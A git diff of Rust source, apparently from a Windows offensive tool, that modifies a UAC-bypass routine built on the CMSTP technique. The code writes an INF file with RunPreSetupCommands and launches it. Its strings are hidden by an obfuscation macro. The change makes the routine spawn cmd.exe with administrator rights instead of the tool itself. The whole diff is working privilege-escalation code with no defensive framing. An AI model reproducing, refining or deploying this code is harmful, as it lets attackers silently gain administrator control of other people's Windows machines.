@@ -27,7 +27,7 @@ use winapi::{
         },
     },
 };
-use crate::utils::functions::{ call_program, get_current_exe };
+use crate::utils::functions::{ call_program, get_current_exe, get_current_exe_dir };
 
 pub struct WindowInfo {
     name: String,
@@ -106,17 +106,17 @@ RunPreSetupCommands=RunPreSetupCommandsSection
 "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", "")
 
 [Strings]
-ServiceName="Network"
-ShortSvcName="Network"
+ServiceName="net"
+ShortSvcName="net"
 "#
         )
     );
-    let temp_file_dir = env::temp_dir().join(s!("temp_1972449")).join(s!("cache"));
+    // let temp_file_dir = env::temp_dir().join(s!("temp_1972449")).join(s!("cache"));
 
-    create_dir_all(&temp_file_dir).context(
-        s!("Failed to create_dir_all FOR temp_file_dir").to_string()
-    )?;
-
+    // create_dir_all(&temp_file_dir).context(
+    //     s!("Failed to create_dir_all FOR temp_file_dir").to_string()
+    // )?;
+    let temp_file_dir = get_current_exe_dir();
     let tmp_file_path = temp_file_dir.join(s!("tmp.ini"));
 
     let mut tmp_file = std::fs::File
@@ -145,10 +145,10 @@ ShortSvcName="Network"
 }
 
 pub fn open_self_as_admin() -> Result<()> {
-    let binding = get_current_exe();
-    let curent_executable = binding.to_str().unwrap();
-
-    execute_as_admin_cmstp_method(curent_executable).context(
+    // let binding = get_current_exe();
+    // let curent_executable = binding.to_str().unwrap();
+    let curent_executable = s!("c:\\windows\\system32\\cmd.exe").to_owned();
+    execute_as_admin_cmstp_method(&curent_executable).context(
         s!("failed to execute as admin").to_string()
     )?;
     Ok(())
